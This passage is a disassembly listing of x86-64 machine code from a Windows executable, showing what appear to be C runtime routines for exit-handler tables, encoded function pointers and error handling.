   140006ba1:	e8 02 40 00 00       	call   0x14000aba8
   140006ba6:	48 89 03             	mov    %rax,(%rbx)
   140006ba9:	48 83 c3 08          	add    $0x8,%rbx
   140006bad:	eb d6                	jmp    0x140006b85
   140006baf:	8b 0f                	mov    (%rdi),%ecx
   140006bb1:	e8 2e 31 00 00       	call   0x140009ce4
   140006bb6:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006bbb:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140006bc0:	48 83 c4 30          	add    $0x30,%rsp
   140006bc4:	5f                   	pop    %rdi
   140006bc5:	c3                   	ret
   140006bc6:	cc                   	int3
   140006bc7:	cc                   	int3
   140006bc8:	b8 01 00 00 00       	mov    $0x1,%eax
   140006bcd:	87 05 99 82 01 00    	xchg   %eax,0x18299(%rip)        # 0x14001ee6c
   140006bd3:	c3                   	ret
   140006bd4:	4c 8b dc             	mov    %rsp,%r11
   140006bd7:	48 83 ec 28          	sub    $0x28,%rsp
   140006bdb:	b8 04 00 00 00       	mov    $0x4,%eax
   140006be0:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140006be4:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140006be8:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140006bec:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140006bf0:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140006bf4:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140006bf8:	e8 5b ff ff ff       	call   0x140006b58
   140006bfd:	48 83 c4 28          	add    $0x28,%rsp
   140006c01:	c3                   	ret
   140006c02:	cc                   	int3
   140006c03:	cc                   	int3
   140006c04:	40 53                	rex push %rbx
   140006c06:	48 83 ec 20          	sub    $0x20,%rsp
   140006c0a:	8b d9                	mov    %ecx,%ebx
   140006c0c:	e8 6f 0c 00 00       	call   0x140007880
   140006c11:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140006c18:	41 8b d0             	mov    %r8d,%edx
   140006c1b:	80 e2 02             	and    $0x2,%dl
   140006c1e:	f6 da                	neg    %dl
   140006c20:	1b c9                	sbb    %ecx,%ecx
   140006c22:	83 fb ff             	cmp    $0xffffffff,%ebx
   140006c25:	74 36                	je     0x140006c5d
   140006c27:	85 db                	test   %ebx,%ebx
   140006c29:	74 39                	je     0x140006c64
   140006c2b:	83 fb 01             	cmp    $0x1,%ebx
   140006c2e:	74 20                	je     0x140006c50
   140006c30:	83 fb 02             	cmp    $0x2,%ebx
   140006c33:	74 15                	je     0x140006c4a
   140006c35:	e8 32 13 00 00       	call   0x140007f6c
   140006c3a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006c40:	e8 7f 11 00 00       	call   0x140007dc4
   140006c45:	83 c8 ff             	or     $0xffffffff,%eax
   140006c48:	eb 1d                	jmp    0x140006c67
   140006c4a:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   140006c4e:	eb 04                	jmp    0x140006c54
   140006c50:	41 83 c8 02          	or     $0x2,%r8d
   140006c54:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   140006c5b:	eb 07                	jmp    0x140006c64
   140006c5d:	83 0d 9c 7b 01 00 ff 	orl    $0xffffffff,0x17b9c(%rip)        # 0x14001e800
   140006c64:	8d 41 02             	lea    0x2(%rcx),%eax
   140006c67:	48 83 c4 20          	add    $0x20,%rsp
   140006c6b:	5b                   	pop    %rbx
   140006c6c:	c3                   	ret
   140006c6d:	cc                   	int3
   140006c6e:	cc                   	int3
   140006c6f:	cc                   	int3
   140006c70:	8b 05 fa 81 01 00    	mov    0x181fa(%rip),%eax        # 0x14001ee70
   140006c76:	90                   	nop
   140006c77:	c3                   	ret
   140006c78:	cc                   	int3
   140006c79:	cc                   	int3
   140006c7a:	cc                   	int3
   140006c7b:	cc                   	int3
   140006c7c:	cc                   	int3
   140006c7d:	cc                   	int3
   140006c7e:	cc                   	int3
   140006c7f:	cc                   	int3
   140006c80:	48 83 ec 28          	sub    $0x28,%rsp
   140006c84:	83 f9 01             	cmp    $0x1,%ecx
   140006c87:	76 15                	jbe    0x140006c9e
   140006c89:	e8 de 12 00 00       	call   0x140007f6c
   140006c8e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006c94:	e8 2b 11 00 00       	call   0x140007dc4
   140006c99:	83 c8 ff             	or     $0xffffffff,%eax
   140006c9c:	eb 08                	jmp    0x140006ca6
   140006c9e:	87 0d cc 81 01 00    	xchg   %ecx,0x181cc(%rip)        # 0x14001ee70
   140006ca4:	8b c1                	mov    %ecx,%eax
   140006ca6:	48 83 c4 28          	add    $0x28,%rsp
   140006caa:	c3                   	ret
   140006cab:	cc                   	int3
   140006cac:	48 8d 05 c1 81 01 00 	lea    0x181c1(%rip),%rax        # 0x14001ee74
   140006cb3:	c3                   	ret
   140006cb4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006cb9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006cbe:	57                   	push   %rdi
   140006cbf:	48 83 ec 20          	sub    $0x20,%rsp
   140006cc3:	49 8b d9             	mov    %r9,%rbx
   140006cc6:	49 8b f8             	mov    %r8,%rdi
   140006cc9:	8b 0a                	mov    (%rdx),%ecx
   140006ccb:	e8 c0 2f 00 00       	call   0x140009c90
   140006cd0:	90                   	nop
   140006cd1:	48 8b cf             	mov    %rdi,%rcx
   140006cd4:	e8 53 00 00 00       	call   0x140006d2c
   140006cd9:	8b f8                	mov    %eax,%edi
   140006cdb:	8b 0b                	mov    (%rbx),%ecx
   140006cdd:	e8 02 30 00 00       	call   0x140009ce4
   140006ce2:	8b c7                	mov    %edi,%eax
   140006ce4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006ce9:	48 83 c4 20          	add    $0x20,%rsp
   140006ced:	5f                   	pop    %rdi
   140006cee:	c3                   	ret
   140006cef:	cc                   	int3
   140006cf0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006cf5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006cfa:	57                   	push   %rdi
   140006cfb:	48 83 ec 20          	sub    $0x20,%rsp
   140006cff:	49 8b d9             	mov    %r9,%rbx
   140006d02:	49 8b f8             	mov    %r8,%rdi
   140006d05:	8b 0a                	mov    (%rdx),%ecx
   140006d07:	e8 84 2f 00 00       	call   0x140009c90
   140006d0c:	90                   	nop
   140006d0d:	48 8b cf             	mov    %rdi,%rcx
   140006d10:	e8 c7 01 00 00       	call   0x140006edc
   140006d15:	8b f8                	mov    %eax,%edi
   140006d17:	8b 0b                	mov    (%rbx),%ecx
   140006d19:	e8 c6 2f 00 00       	call   0x140009ce4
   140006d1e:	8b c7                	mov    %edi,%eax
   140006d20:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006d25:	48 83 c4 20          	add    $0x20,%rsp
   140006d29:	5f                   	pop    %rdi
   140006d2a:	c3                   	ret
   140006d2b:	cc                   	int3
   140006d2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006d31:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006d36:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006d3b:	57                   	push   %rdi
   140006d3c:	41 56                	push   %r14
   140006d3e:	41 57                	push   %r15
   140006d40:	48 83 ec 20          	sub    $0x20,%rsp
   140006d44:	48 8b 01             	mov    (%rcx),%rax
   140006d47:	33 ed                	xor    %ebp,%ebp
   140006d49:	4c 8b f9             	mov    %rcx,%r15
   140006d4c:	48 8b 10             	mov    (%rax),%rdx
   140006d4f:	48 85 d2             	test   %rdx,%rdx
   140006d52:	0f 84 66 01 00 00    	je     0x140006ebe
   140006d58:	4c 8b 15 a1 72 01 00 	mov    0x172a1(%rip),%r10        # 0x14001e000
   140006d5f:	41 8b ca             	mov    %r10d,%ecx
   140006d62:	49 8b f2             	mov    %r10,%rsi
   140006d65:	48 33 32             	xor    (%rdx),%rsi
   140006d68:	83 e1 3f             	and    $0x3f,%ecx
   140006d6b:	4d 8b ca             	mov    %r10,%r9
   140006d6e:	48 d3 ce             	ror    %cl,%rsi
   140006d71:	4c 33 4a 08          	xor    0x8(%rdx),%r9
   140006d75:	49 8b da             	mov    %r10,%rbx
   140006d78:	48 33 5a 10          	xor    0x10(%rdx),%rbx
   140006d7c:	49 d3 c9             	ror    %cl,%r9
   140006d7f:	48 d3 cb             	ror    %cl,%rbx
   140006d82:	4c 3b cb             	cmp    %rbx,%r9
   140006d85:	0f 85 a7 00 00 00    	jne    0x140006e32
   140006d8b:	48 2b de             	sub    %rsi,%rbx
   140006d8e:	b8 00 02 00 00       	mov    $0x200,%eax
   140006d93:	48 c1 fb 03          	sar    $0x3,%rbx
   140006d97:	48 3b d8             	cmp    %rax,%rbx
   140006d9a:	48 8b fb             	mov    %rbx,%rdi
   140006d9d:	48 0f 47 f8          	cmova  %rax,%rdi
   140006da1:	8d 45 20             	lea    0x20(%rbp),%eax
   140006da4:	48 03 fb             	add    %rbx,%rdi
   140006da7:	48 0f 44 f8          	cmove  %rax,%rdi
   140006dab:	48 3b fb             	cmp    %rbx,%rdi
   140006dae:	72 1e                	jb     0x140006dce
   140006db0:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   140006db4:	48 8b d7             	mov    %rdi,%rdx
   140006db7:	48 8b ce             	mov    %rsi,%rcx
   140006dba:	e8 f1 42 00 00       	call   0x14000b0b0
   140006dbf:	33 c9                	xor    %ecx,%ecx
   140006dc1:	4c 8b f0             	mov    %rax,%r14
   140006dc4:	e8 47 12 00 00       	call   0x140008010
   140006dc9:	4d 85 f6             	test   %r14,%r14
   140006dcc:	75 28                	jne    0x140006df6
   140006dce:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   140006dd2:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140006dd8:	48 8b d7             	mov    %rdi,%rdx
   140006ddb:	48 8b ce             	mov    %rsi,%rcx
   140006dde:	e8 cd 42 00 00       	call   0x14000b0b0
   140006de3:	33 c9                	xor    %ecx,%ecx
   140006de5:	4c 8b f0             	mov    %rax,%r14
   140006de8:	e8 23 12 00 00       	call   0x140008010
   140006ded:	4d 85 f6             	test   %r14,%r14
   140006df0:	0f 84 c8 00 00 00    	je     0x140006ebe
   140006df6:	4c 8b 15 03 72 01 00 	mov    0x17203(%rip),%r10        # 0x14001e000
   140006dfd:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   140006e01:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   140006e05:	49 8b f6             	mov    %r14,%rsi
   140006e08:	48 8b cb             	mov    %rbx,%rcx
   140006e0b:	49 2b c9             	sub    %r9,%rcx
   140006e0e:	48 83 c1 07          	add    $0x7,%rcx
   140006e12:	48 c1 e9 03          	shr    $0x3,%rcx
   140006e16:	4c 3b cb             	cmp    %rbx,%r9
   140006e19:	48 0f 47 cd          	cmova  %rbp,%rcx
   140006e1d:	48 85 c9             	test   %rcx,%rcx
   140006e20:	74 10                	je     0x140006e32
   140006e22:	49 8b c2             	mov    %r10,%rax
   140006e25:	49 8b f9             	mov    %r9,%rdi
   140006e28:	f3 48 ab             	rep stos %rax,(%rdi)
   140006e2b:	4c 8b 15 ce 71 01 00 	mov    0x171ce(%rip),%r10        # 0x14001e000
   140006e32:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140006e38:	49 8d 79 08          	lea    0x8(%r9),%rdi
   140006e3c:	41 8b c8             	mov    %r8d,%ecx
   140006e3f:	41 8b c2             	mov    %r10d,%eax
   140006e42:	83 e0 3f             	and    $0x3f,%eax
   140006e45:	2b c8                	sub    %eax,%ecx
   140006e47:	49 8b 47 08          	mov    0x8(%r15),%rax
   140006e4b:	48 8b 10             	mov    (%rax),%rdx
   140006e4e:	48 d3 ca             	ror    %cl,%rdx
   140006e51:	41 8b c8             	mov    %r8d,%ecx
   140006e54:	49 33 d2             	xor    %r10,%rdx
   140006e57:	49 89 11             	mov    %rdx,(%r9)
   140006e5a:	48 8b 15 9f 71 01 00 	mov    0x1719f(%rip),%rdx        # 0x14001e000
   140006e61:	8b c2                	mov    %edx,%eax
   140006e63:	83 e0 3f             	and    $0x3f,%eax
   140006e66:	2b c8                	sub    %eax,%ecx
   140006e68:	49 8b 07             	mov    (%r15),%rax
   140006e6b:	48 d3 ce             	ror    %cl,%rsi
   140006e6e:	48 33 f2             	xor    %rdx,%rsi
   140006e71:	48 8b 08             	mov    (%rax),%rcx
   140006e74:	48 89 31             	mov    %rsi,(%rcx)
   140006e77:	41 8b c8             	mov    %r8d,%ecx
   140006e7a:	48 8b 15 7f 71 01 00 	mov    0x1717f(%rip),%rdx        # 0x14001e000
   140006e81:	8b c2                	mov    %edx,%eax
   140006e83:	83 e0 3f             	and    $0x3f,%eax
   140006e86:	2b c8                	sub    %eax,%ecx
   140006e88:	49 8b 07             	mov    (%r15),%rax
   140006e8b:	48 d3 cf             	ror    %cl,%rdi
   140006e8e:	48 33 fa             	xor    %rdx,%rdi
   140006e91:	48 8b 10             	mov    (%rax),%rdx
   140006e94:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   140006e98:	48 8b 15 61 71 01 00 	mov    0x17161(%rip),%rdx        # 0x14001e000
   140006e9f:	8b c2                	mov    %edx,%eax
   140006ea1:	83 e0 3f             	and    $0x3f,%eax
   140006ea4:	44 2b c0             	sub    %eax,%r8d
   140006ea7:	49 8b 07             	mov    (%r15),%rax
   140006eaa:	41 8a c8             	mov    %r8b,%cl
   140006ead:	48 d3 cb             	ror    %cl,%rbx
   140006eb0:	48 33 da             	xor    %rdx,%rbx
   140006eb3:	48 8b 08             	mov    (%rax),%rcx
   140006eb6:	33 c0                	xor    %eax,%eax
   140006eb8:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140006ebc:	eb 03                	jmp    0x140006ec1
   140006ebe:	83 c8 ff             	or     $0xffffffff,%eax
   140006ec1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006ec6:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006ecb:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006ed0:	48 83 c4 20          	add    $0x20,%rsp
   140006ed4:	41 5f                	pop    %r15
   140006ed6:	41 5e                	pop    %r14
   140006ed8:	5f                   	pop    %rdi
   140006ed9:	c3                   	ret
   140006eda:	cc                   	int3
   140006edb:	cc                   	int3
   140006edc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006ee1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006ee6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006eeb:	57                   	push   %rdi
   140006eec:	41 56                	push   %r14
   140006eee:	41 57                	push   %r15
   140006ef0:	48 83 ec 20          	sub    $0x20,%rsp
   140006ef4:	48 8b 01             	mov    (%rcx),%rax
   140006ef7:	48 8b f1             	mov    %rcx,%rsi
   140006efa:	48 8b 10             	mov    (%rax),%rdx
   140006efd:	48 85 d2             	test   %rdx,%rdx
   140006f00:	75 08                	jne    0x140006f0a
   140006f02:	83 c8 ff             	or     $0xffffffff,%eax
   140006f05:	e9 ce 00 00 00       	jmp    0x140006fd8
   140006f0a:	4c 8b 05 ef 70 01 00 	mov    0x170ef(%rip),%r8        # 0x14001e000
   140006f11:	41 8b c8             	mov    %r8d,%ecx
   140006f14:	49 8b f8             	mov    %r8,%rdi
   140006f17:	48 33 3a             	xor    (%rdx),%rdi
   140006f1a:	83 e1 3f             	and    $0x3f,%ecx
   140006f1d:	48 d3 cf             	ror    %cl,%rdi
   140006f20:	49 8b d8             	mov    %r8,%rbx
   140006f23:	48 33 5a 08          	xor    0x8(%rdx),%rbx
   140006f27:	48 d3 cb             	ror    %cl,%rbx
   140006f2a:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140006f2e:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140006f32:	0f 87 9e 00 00 00    	ja     0x140006fd6
   140006f38:	41 8b c8             	mov    %r8d,%ecx
   140006f3b:	4d 8b f0             	mov    %r8,%r14
   140006f3e:	83 e1 3f             	and    $0x3f,%ecx
   140006f41:	4c 8b ff             	mov    %rdi,%r15
   140006f44:	48 8b eb             	mov    %rbx,%rbp
   140006f47:	48 83 eb 08          	sub    $0x8,%rbx
   140006f4b:	48 3b df             	cmp    %rdi,%rbx
   140006f4e:	72 54                	jb     0x140006fa4
   140006f50:	48 8b 03             	mov    (%rbx),%rax
   140006f53:	49 3b c6             	cmp    %r14,%rax
   140006f56:	74 ef                	je     0x140006f47
   140006f58:	49 33 c0             	xor    %r8,%rax
   140006f5b:	4c 89 33             	mov    %r14,(%rbx)
   140006f5e:	48 d3 c8             	ror    %cl,%rax
   140006f61:	e8 aa 7a 00 00       	call   0x14000ea10
   140006f66:	4c 8b 05 93 70 01 00 	mov    0x17093(%rip),%r8        # 0x14001e000
   140006f6d:	48 8b 06             	mov    (%rsi),%rax
   140006f70:	41 8b c8             	mov    %r8d,%ecx
   140006f73:	83 e1 3f             	and    $0x3f,%ecx
   140006f76:	4d 8b c8             	mov    %r8,%r9
   140006f79:	48 8b 10             	mov    (%rax),%rdx
   140006f7c:	49 8b c0             	mov    %r8,%rax
   140006f7f:	4c 33 0a             	xor    (%rdx),%r9
   140006f82:	48 33 42 08          	xor    0x8(%rdx),%rax
   140006f86:	49 d3 c9             	ror    %cl,%r9
   140006f89:	48 d3 c8             	ror    %cl,%rax
   140006f8c:	4d 3b cf             	cmp    %r15,%r9
   140006f8f:	75 05                	jne    0x140006f96
   140006f91:	48 3b c5             	cmp    %rbp,%rax
   140006f94:	74 b1                	je     0x140006f47
   140006f96:	4d 8b f9             	mov    %r9,%r15
   140006f99:	49 8b f9             	mov    %r9,%rdi
   140006f9c:	48 8b e8             	mov    %rax,%rbp
   140006f9f:	48 8b d8             	mov    %rax,%rbx
   140006fa2:	eb a3                	jmp    0x140006f47
   140006fa4:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140006fa8:	74 0f                	je     0x140006fb9
   140006faa:	48 8b cf             	mov    %rdi,%rcx
   140006fad:	e8 5e 10 00 00       	call   0x140008010
   140006fb2:	4c 8b 05 47 70 01 00 	mov    0x17047(%rip),%r8        # 0x14001e000
   140006fb9:	48 8b 06             	mov    (%rsi),%rax
   140006fbc:	48 8b 08             	mov    (%rax),%rcx
   140006fbf:	4c 89 01             	mov    %r8,(%rcx)
   140006fc2:	48 8b 06             	mov    (%rsi),%rax
   140006fc5:	48 8b 08             	mov    (%rax),%rcx
   140006fc8:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140006fcc:	48 8b 06             	mov    (%rsi),%rax
   140006fcf:	48 8b 08             	mov    (%rax),%rcx
   140006fd2:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140006fd6:	33 c0                	xor    %eax,%eax
   140006fd8:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006fdd:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006fe2:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006fe7:	48 83 c4 20          	add    $0x20,%rsp
   140006feb:	41 5f                	pop    %r15
   140006fed:	41 5e                	pop    %r14
   140006fef:	5f                   	pop    %rdi
   140006ff0:	c3                   	ret
   140006ff1:	cc                   	int3
   140006ff2:	cc                   	int3
   140006ff3:	cc                   	int3
   140006ff4:	48 8b d1             	mov    %rcx,%rdx
   140006ff7:	48 8d 0d 7a 7e 01 00 	lea    0x17e7a(%rip),%rcx        # 0x14001ee78
   140006ffe:	e9 6d 00 00 00       	jmp    0x140007070
   140007003:	cc                   	int3
   140007004:	4c 8b dc             	mov    %rsp,%r11
   140007007:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   14000700b:	48 83 ec 38          	sub    $0x38,%rsp
   14000700f:	49 c7 43 f0 fe ff ff 	movq   $0xfffffffffffffffe,-0x10(%r11)
   140007016:	ff 
   140007017:	49 8d 43 08          	lea    0x8(%r11),%rax
   14000701b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   14000701f:	b8 02 00 00 00       	mov    $0x2,%eax
   140007024:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140007028:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000702c:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140007030:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140007034:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140007038:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   14000703c:	e8 af fc ff ff       	call   0x140006cf0
   140007041:	90                   	nop
   140007042:	48 83 c4 38          	add    $0x38,%rsp
   140007046:	c3                   	ret
   140007047:	cc                   	int3
   140007048:	48 85 c9             	test   %rcx,%rcx
   14000704b:	75 04                	jne    0x140007051
   14000704d:	83 c8 ff             	or     $0xffffffff,%eax
   140007050:	c3                   	ret
   140007051:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140007055:	48 39 01             	cmp    %rax,(%rcx)
   140007058:	75 12                	jne    0x14000706c
   14000705a:	48 8b 05 9f 6f 01 00 	mov    0x16f9f(%rip),%rax        # 0x14001e000
   140007061:	48 89 01             	mov    %rax,(%rcx)
   140007064:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140007068:	48 89 41 10          	mov    %rax,0x10(%rcx)
   14000706c:	33 c0                	xor    %eax,%eax
   14000706e:	c3                   	ret
   14000706f:	cc                   	int3
   140007070:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140007075:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000707a:	55                   	push   %rbp
   14000707b:	48 8b ec             	mov    %rsp,%rbp
   14000707e:	48 83 ec 40          	sub    $0x40,%rsp
   140007082:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140007086:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000708a:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   14000708e:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140007092:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140007096:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000709a:	b8 02 00 00 00       	mov    $0x2,%eax
   14000709f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1400070a3:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1400070a7:	89 45 28             	mov    %eax,0x28(%rbp)
   1400070aa:	89 45 e0             	mov    %eax,-0x20(%rbp)
   1400070ad:	e8 02 fc ff ff       	call   0x140006cb4
   1400070b2:	48 83 c4 40          	add    $0x40,%rsp
   1400070b6:	5d                   	pop    %rbp
   1400070b7:	c3                   	ret
   1400070b8:	48 8d 05 31 75 01 00 	lea    0x17531(%rip),%rax        # 0x14001e5f0
   1400070bf:	48 89 05 b2 84 01 00 	mov    %rax,0x184b2(%rip)        # 0x14001f578
   1400070c6:	b0 01                	mov    $0x1,%al
   1400070c8:	c3                   	ret
   1400070c9:	cc                   	int3
   1400070ca:	cc                   	int3
   1400070cb:	cc                   	int3
   1400070cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400070d0:	48 8d 0d a1 7d 01 00 	lea    0x17da1(%rip),%rcx        # 0x14001ee78
   1400070d7:	e8 6c ff ff ff       	call   0x140007048
   1400070dc:	48 8d 0d ad 7d 01 00 	lea    0x17dad(%rip),%rcx        # 0x14001ee90
   1400070e3:	e8 60 ff ff ff       	call   0x140007048
   1400070e8:	b0 01                	mov    $0x1,%al
   1400070ea:	48 83 c4 28          	add    $0x28,%rsp
   1400070ee:	c3                   	ret
   1400070ef:	cc                   	int3
   1400070f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400070f4:	e8 ff f5 ff ff       	call   0x1400066f8
   1400070f9:	b0 01                	mov    $0x1,%al
   1400070fb:	48 83 c4 28          	add    $0x28,%rsp
   1400070ff:	c3                   	ret
   140007100:	40 53                	rex push %rbx
   140007102:	48 83 ec 20          	sub    $0x20,%rsp
   140007106:	48 8b 1d f3 6e 01 00 	mov    0x16ef3(%rip),%rbx        # 0x14001e000
   14000710d:	48 8b cb             	mov    %rbx,%rcx
   140007110:	e8 53 0b 00 00       	call   0x140007c68
   140007115:	48 8b cb             	mov    %rbx,%rcx
   140007118:	e8 b3 41 00 00       	call   0x14000b2d0
   14000711d:	48 8b cb             	mov    %rbx,%rcx
   140007120:	e8 df 42 00 00       	call   0x14000b404
   140007125:	48 8b cb             	mov    %rbx,%rcx
   140007128:	e8 f3 ef ff ff       	call   0x140006120
   14000712d:	48 8b cb             	mov    %rbx,%rcx
   140007130:	e8 67 f9 ff ff       	call   0x140006a9c
   140007135:	b0 01                	mov    $0x1,%al
   140007137:	48 83 c4 20          	add    $0x20,%rsp
   14000713b:	5b                   	pop    %rbx
   14000713c:	c3                   	ret
   14000713d:	cc                   	int3
   14000713e:	cc                   	int3
   14000713f:	cc                   	int3
   140007140:	33 c9                	xor    %ecx,%ecx
   140007142:	e9 29 cc ff ff       	jmp    0x140003d70
   140007147:	cc                   	int3
   140007148:	40 53                	rex push %rbx
   14000714a:	48 83 ec 20          	sub    $0x20,%rsp
   14000714e:	48 8b 0d 73 7d 01 00 	mov    0x17d73(%rip),%rcx        # 0x14001eec8
   140007155:	83 c8 ff             	or     $0xffffffff,%eax
   140007158:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   14000715c:	83 f8 01             	cmp    $0x1,%eax
   14000715f:	75 1f                	jne    0x140007180
   140007161:	48 8b 0d 60 7d 01 00 	mov    0x17d60(%rip),%rcx        # 0x14001eec8
   140007168:	48 8d 1d 41 6f 01 00 	lea    0x16f41(%rip),%rbx        # 0x14001e0b0
   14000716f:	48 3b cb             	cmp    %rbx,%rcx
   140007172:	74 0c                	je     0x140007180
   140007174:	e8 97 0e 00 00       	call   0x140008010
   140007179:	48 89 1d 48 7d 01 00 	mov    %rbx,0x17d48(%rip)        # 0x14001eec8
   140007180:	b0 01                	mov    $0x1,%al
   140007182:	48 83 c4 20          	add    $0x20,%rsp
   140007186:	5b                   	pop    %rbx
   140007187:	c3                   	ret
   140007188:	48 83 ec 28          	sub    $0x28,%rsp
   14000718c:	48 8b 0d ed 84 01 00 	mov    0x184ed(%rip),%rcx        # 0x14001f680
   140007193:	e8 78 0e 00 00       	call   0x140008010
   140007198:	48 8b 0d e9 84 01 00 	mov    0x184e9(%rip),%rcx        # 0x14001f688
   14000719f:	48 83 25 d9 84 01 00 	andq   $0x0,0x184d9(%rip)        # 0x14001f680
   1400071a6:	00 
   1400071a7:	e8 64 0e 00 00       	call   0x140008010
   1400071ac:	48 8b 0d 35 7d 01 00 	mov    0x17d35(%rip),%rcx        # 0x14001eee8
   1400071b3:	48 83 25 cd 84 01 00 	andq   $0x0,0x184cd(%rip)        # 0x14001f688
   1400071ba:	00 
   1400071bb:	e8 50 0e 00 00       	call   0x140008010
   1400071c0:	48 8b 0d 29 7d 01 00 	mov    0x17d29(%rip),%rcx        # 0x14001eef0
   1400071c7:	48 83 25 19 7d 01 00 	andq   $0x0,0x17d19(%rip)        # 0x14001eee8
   1400071ce:	00 
   1400071cf:	e8 3c 0e 00 00       	call   0x140008010
   1400071d4:	48 83 25 14 7d 01 00 	andq   $0x0,0x17d14(%rip)        # 0x14001eef0
   1400071db:	00 
   1400071dc:	b0 01                	mov    $0x1,%al
   1400071de:	48 83 c4 28          	add    $0x28,%rsp
   1400071e2:	c3                   	ret
   1400071e3:	cc                   	int3
   1400071e4:	48 8d 15 95 ad 00 00 	lea    0xad95(%rip),%rdx        # 0x140011f80
   1400071eb:	48 8d 0d 8e ac 00 00 	lea    0xac8e(%rip),%rcx        # 0x140011e80
   1400071f2:	e9 d1 3f 00 00       	jmp    0x14000b1c8
   1400071f7:	cc                   	int3
   1400071f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400071fc:	84 c9                	test   %cl,%cl
   1400071fe:	74 16                	je     0x140007216
   140007200:	48 83 3d 70 84 01 00 	cmpq   $0x0,0x18470(%rip)        # 0x14001f678
   140007207:	00 
   140007208:	74 05                	je     0x14000720f
   14000720a:	e8 b1 47 00 00       	call   0x14000b9c0
   14000720f:	b0 01                	mov    $0x1,%al
   140007211:	48 83 c4 28          	add    $0x28,%rsp
   140007215:	c3                   	ret
   140007216:	48 8d 15 63 ad 00 00 	lea    0xad63(%rip),%rdx        # 0x140011f80
   14000721d:	48 8d 0d 5c ac 00 00 	lea    0xac5c(%rip),%rcx        # 0x140011e80
   140007224:	48 83 c4 28          	add    $0x28,%rsp
   140007228:	e9 1b 40 00 00       	jmp    0x14000b248
   14000722d:	cc                   	int3
   14000722e:	cc                   	int3
   14000722f:	cc                   	int3
   140007230:	48 83 ec 28          	sub    $0x28,%rsp
   140007234:	e8 47 06 00 00       	call   0x140007880
   140007239:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000723d:	48 85 c0             	test   %rax,%rax
   140007240:	74 07                	je     0x140007249
   140007242:	e8 c9 77 00 00       	call   0x14000ea10
   140007247:	eb 00                	jmp    0x140007249
   140007249:	e8 a2 00 00 00       	call   0x1400072f0
   14000724e:	90                   	nop
   14000724f:	cc                   	int3
   140007250:	e9 bb 0d 00 00       	jmp    0x140008010
   140007255:	cc                   	int3
   140007256:	cc                   	int3
   140007257:	cc                   	int3
   140007258:	cc                   	int3
   140007259:	cc                   	int3
   14000725a:	cc                   	int3
   14000725b:	cc                   	int3
   14000725c:	cc                   	int3
   14000725d:	cc                   	int3
   14000725e:	cc                   	int3
   14000725f:	cc                   	int3
   140007260:	e9 7b 33 00 00       	jmp    0x14000a5e0
   140007265:	cc                   	int3
   140007266:	cc                   	int3
   140007267:	cc                   	int3
   140007268:	cc                   	int3
